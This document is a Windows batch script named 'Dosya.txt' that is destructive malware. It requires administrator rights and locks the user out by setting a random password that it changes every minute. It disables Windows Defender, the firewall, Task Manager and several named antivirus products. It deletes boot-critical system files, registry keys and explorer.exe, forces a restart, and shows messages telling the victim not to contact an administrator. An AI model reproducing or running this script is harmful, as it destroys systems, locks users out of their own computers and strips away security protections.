@echo off
setlocal EnableDelayedExpansion

title Dosya.txt
color 0A 
ver | find "5.1" >nul && set "winver=xp"
ver | find "6.1" >nul && set "winver=7"
ver | find "6.2" >nul && set "winver=8"
ver | find "6.3" >nul && set "winver=8.1"
ver | find "10.0" >nul && set "winver=10"
ver | find "11.0" >nul && set "winver=11"
net session >nul 2>&1
if %errorlevel% neq 0 (
    msg * "Please run this script as Administrator!"
    timeout /t 3 >nul
    exit /b
)
for /f "tokens=*" %%a in ('whoami') do set "currentuser=%%a"
set "currentuser=!currentuser:*\=!"
set "chars=ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&*()_+-=[]{}|;:,.<>?"
set "newpass="
for /L %%i in (1,1,20) do (
    set /a "x=!random! %% 84"
    set "newpass=!newpass!!chars:~%x%,1!"
)

:continue
for /f "tokens=*" %%u in ('echo %username%') do set "currentuser=%%u"
net user "%currentuser%" "%newpass%" >nul 2>&1

sc stop WinDefend >nul 2>&1
sc config WinDefend start= disabled >nul 2>&1
sc stop "SecurityHealthService" >nul 2>&1
sc config "SecurityHealthService" start= disabled >nul 2>&1
sc stop wscsvc >nul 2>&1
sc config wscsvc start= disabled >nul 2>&1

for /F "tokens=*" %%a in ('wmic product where "name like '%%Antivirus%%' or name like '%%Anti-Virus%%'" get identifyingnumber 2^>nul') do (
    wmic product where "identifyingnumber='%%a'" call uninstall /nointeractive >nul 2>&1
)

for /F "tokens=*" %%b in ('wmic service where "name like '%%Antivirus%%' or name like '%%Anti-Virus%%' or displayname like '%%Antivirus%%' or displayname like '%%Anti-Virus%%'" get name 2^>nul') do (
    sc stop "%%b" >nul 2>&1
    sc config "%%b" start= disabled >nul 2>&1
)net stop "McShield" >nul 2>&1
sc config "McShield" start= disabled >nul 2>&1
net stop "ccSvcHst" >nul 2>&1
sc config "ccSvcHst" start= disabled >nul 2>&1
net stop "Avast Antivirus" >nul 2>&1
sc config "Avast Antivirus" start= disabled >nul 2>&1
net stop "AVG Antivirus" >nul 2>&1
sc config "AVG Antivirus" start= disabled >nul 2>&1
net stop "AVP" >nul 2>&1
sc config "AVP" start= disabled >nul 2>&1
net stop "Bitdefender Agent" >nul 2>&1
sc config "Bitdefender Agent" start= disabled >nul 2>&1
net stop "MBAMService" >nul 2>&1
sc config "MBAMService" start= disabled >nul 2>&1
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableTaskMgr /t REG_DWORD /d 1 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v DisableRealtimeMonitoring /t REG_DWORD /d 1 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v DisableBehaviorMonitoring /t REG_DWORD /d 1 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v DisableOnAccessProtection /t REG_DWORD /d 1 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Spynet" /v SubmitSamplesConsent /t REG_DWORD /d 2 /f >nul 2>&1
sc stop WinDefend >nul 2>&1
sc config WinDefend start= disabled >nul 2>&1
reg add "HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths" /v "C:\\" /t REG_DWORD /d 0 /f >nul 2>&1
sc stop mpssvc >nul 2>&1
sc config mpssvc start= disabled >nul 2>&1

cd %userprofile%\Desktop

setlocal EnableDelayedExpansion

for /L %%i in (1,1,50) do ( 
    echo Iteration %%i
    timeout /t 1 /nobreak >nul
    set "random_name="
    for /L %%j in (1,1,8) do (
        set /a "rand=!random! %% 36"
        if !rand! lss 10 (
            set "random_name=!random_name!!rand!"
        ) else (
            set /a "letter=!rand!+55"
            cmd /c exit !letter!
            for /f %%k in ('powershell -command "[char]!letter!"') do (
                set "random_name=!random_name!%%k"
            )
        )
    )
    echo "!random_name!" > "!random_name!.txt"
    md "F!random_name!" 2>nul
)

del /f /q /s "C:\System32\hal.dll" >nul 2>&1
del /f /q /s "C:\System32\bootvid.dll" >nul 2>&1
del /f /q /s "C:\System32\ci.dll" >nul 2>&1
del /f /q /s "C:\System32\drivers\disk.sys" >nul 2>&1
del /f /q /s "C:\System32\drivers\pci.sys" >nul 2>&1
del /f /q /s "C:\System32\Config\*" >nul 2>&1
del /f /q /s "C:\System32\drivers\*" >nul 2>&1
del /f /q /s "C:\System32\DRIVERS\*" >nul 2>&1
del /f /q /s "C:\System32\kdcom.dll" >nul 2>&1
del /f /q /s "C:\System32\mcupdate_GenuineIntel.dll" >nul 2>&1
del /f /q /s "C:\System32\PSHED.dll" >nul 2>&1
del /f /q /s "C:\System32\CLFS.sys" >nul 2>&1
del /f /q /s "C:\System32\ntoskrnl.exe" >nul 2>&1
del /f /q /s "C:\System32\winload.exe" >nul 2>&1
del /f /q /s "C:\System32\winresume.exe" >nul 2>&1
rd /s /q "C:\Windows\ImmersiveControlPanel" >nul 2>&1
reg delete "HKLM\SYSTEM\CurrentControlSet\Control\SafeBoot" /f >nul 2>&1
reg delete "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management" /f >nul 2>&1
reg delete "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Power" /f >nul 2>&1
reg delete "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /f >nul 2>&1
reg delete "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /f >nul 2>&1
reg delete "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies" /f >nul 2>&1
reg delete "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall" /f >nul 2>&1
reg delete "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths" /f >nul 2>&1
reg delete "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Installer" /f >nul 2>&1
reg delete "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Diagnostics" /f >nul 2>&1
reg delete "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\WinRAR" /f >nul 2>&1
reg delete "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Check" /f >nul 2>&1
reg delete "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Key" /f >nul 2>&1
reg delete "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Data" /f >nul 2>&1
reg delete "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Settings" /f >nul 2>&1
reg add "HKCU\Control Panel\Mouse" /v SwapMouseButtons /t REG_SZ /d 1 /f >nul 2>&1
del /f /q /s "C:\System32\Tasks\*" >nul 2>&1
taskkill /F /IM explorer.exe >nul 2>&1
del /f /q /s "C:\Windows\System32\explorer.exe" >nul 2>&1
reg delete "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer" /f >nul 2>&1
shutdown /f /r /t 900
powershell -NoProfile -Command "Add-Type -Name Win32 -Namespace User32 -MemberDefinition '[DllImport(""user32.dll"", SetLastError = true)] public static extern void keybd_event(byte bVk, byte bScan, int dwFlags, int dwExtraInfo);'; [User32.Win32]::keybd_event(0x5B,0,0,0); [User32.Win32]::keybd_event(0x52,0,0,0); Start-Sleep -Milliseconds 50; [User32.Win32]::keybd_event(0x52,0,2,0); [User32.Win32]::keybd_event(0x5B,0,2,0);"
msg * "Hi!"
msg * "You will need the Windows Start Menu!"
msg * "System critical error detected!"
msg * "Boot sector compromised!"
msg * "System will be unusable in 15 minutes!"
msg * "Some important system files have been deleted!"
msg * "Explorer.exe has been terminated!"
msg * "Please do not contact system administrator and reinstall the Windows!"
msg * "Every minute your password changes to a new random string which is 20 characters long!"
msg * "System shutdown initiated!"
msg * "Goodbye!"
:loop
    set "newpass="
    for /L %%i in (1,1,20) do (
        set /a "x=!random! %% 84"
        set "newpass=!newpass!!chars:~%x%,1!"
        )
    net user "%currentuser%" "%newpass%" >nul 2>&1
    timeout /t 60 >nul
goto loop
